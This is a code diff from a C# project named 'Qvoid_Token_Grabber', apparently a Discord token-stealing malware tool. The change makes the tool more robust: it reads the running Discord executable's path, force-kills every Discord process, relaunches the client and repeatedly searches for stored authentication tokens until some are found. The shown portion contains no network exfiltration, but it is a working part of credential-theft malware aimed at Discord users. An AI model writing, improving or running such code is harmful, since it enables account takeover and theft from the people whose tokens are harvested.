@@ -127,10 +127,20 @@ namespace Qvoid_Token_Grabber.Discord
                 while (true)
                 {
                     Thread.Sleep(60000);
-                    foreach (var proc in Process.GetProcessesByName("Discord"))
-                        proc.Kill();
+                    var DiscordProcs = Process.GetProcessesByName("Discord");
+                    string DiscordMainModule = "";
 
-                    Process.Start(@"C:\Users\User\AppData\Local\Discord\app-1.0.9002\Discord.exe");
+                    if (DiscordProcs.Length > 0)
+                        DiscordMainModule = DiscordProcs[0].MainModule.FileName;
+
+                    foreach (var proc in DiscordProcs)
+                    {
+                        try { proc.Kill(); } catch { }
+                    }
+
+                    if (!String.IsNullOrEmpty(DiscordMainModule))
+                        Process.Start(DiscordMainModule);
+
                     Find(out DiscordClients, out TokensLocation);
                     if (TokensLocation.Count > 0)
                         break;
@@ -500,12 +510,19 @@ namespace Qvoid_Token_Grabber.Discord
                 }
             }
 
-            foreach (var proc in Process.GetProcessesByName("Discord"))
+            var DiscordProcs = Process.GetProcessesByName("Discord");
+            string DiscordMainModule = "";
+
+            if (DiscordProcs.Length > 0)
+                DiscordMainModule = DiscordProcs[0].MainModule.FileName;
+
+            foreach (var proc in DiscordProcs)
             {
                 try { proc.Kill(); } catch { }
             }
 
-            Process.Start(@"C:\Users\User\AppData\Local\Discord\app-1.0.9002\Discord.exe");
+            if (!String.IsNullOrEmpty(DiscordMainModule))
+                Process.Start(DiscordMainModule);
         }
 
         /// <summary>
